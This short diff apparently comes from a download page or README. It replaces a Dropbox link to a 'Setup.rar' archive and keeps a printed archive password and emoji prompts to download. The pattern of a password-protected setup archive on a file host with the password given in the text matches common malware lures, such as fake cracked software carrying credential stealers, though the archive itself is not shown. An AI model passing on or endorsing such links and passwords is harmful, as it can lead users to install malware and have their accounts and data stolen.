@@ -8,7 +8,8 @@
 📺PASS: QEST24
 
 📺DOWNLOAD👇👇👇 
-https://www.dropbox.com/scl/fi/v3k9iu7n52a25s17pbn3q/Setup.rar?rlkey=lougt0fluaoso6qz9wkrm0n95&dl=1
+
+https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
 
 
 System requirements
